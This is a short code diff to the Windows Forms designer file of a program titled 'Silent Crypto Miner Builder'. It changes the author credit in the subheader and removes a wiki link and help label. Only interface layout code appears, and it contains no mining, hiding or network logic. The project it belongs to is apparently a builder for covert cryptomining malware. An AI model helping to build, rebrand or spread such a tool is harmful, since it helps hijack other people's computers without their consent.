@@ -154,7 +154,7 @@ namespace SilentCryptoMiner
             this.formBuilder.MinimumSize = new System.Drawing.Size(535, 272);
             this.formBuilder.Name = "formBuilder";
             this.formBuilder.Size = new System.Drawing.Size(535, 272);
-            this.formBuilder.SubHeader = "By Unam Sanctam";
+            this.formBuilder.SubHeader = "By Uman Sactam";
             this.formBuilder.TabIndex = 0;
             this.formBuilder.Text = "Silent Crypto Miner Builder";
             // 
@@ -313,30 +313,6 @@ namespace SilentCryptoMiner
             this.labelMiners.Size = new System.Drawing.Size(51, 17);
             this.labelMiners.TabIndex = 42;
             this.labelMiners.Text = "Miners:";
-            // 
-            // labelWiki
-            // 
-            this.labelWiki.AutoSize = true;
-            this.labelWiki.BackColor = System.Drawing.Color.Transparent;
-            this.labelWiki.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
-            this.labelWiki.Location = new System.Drawing.Point(378, 10);
-            this.labelWiki.Name = "labelWiki";
-            this.labelWiki.Size = new System.Drawing.Size(29, 17);
-            this.labelWiki.TabIndex = 40;
-            this.labelWiki.TabStop = true;
-            this.labelWiki.Text = "wiki";
-            this.labelWiki.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.labelWiki_LinkClicked);
-            // 
-            // labelHelp
-            // 
-            this.labelHelp.BackColor = System.Drawing.Color.Transparent;
-            this.labelHelp.Location = new System.Drawing.Point(176, 11);
-            this.labelHelp.Name = "labelHelp";
-            this.labelHelp.RightToLeft = System.Windows.Forms.RightToLeft.No;
-            this.labelHelp.Size = new System.Drawing.Size(210, 17);
-            this.labelHelp.TabIndex = 41;
-            this.labelHelp.Text = "For help please check the ";
-            this.labelHelp.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
             // 
             // tabStartup
             // 
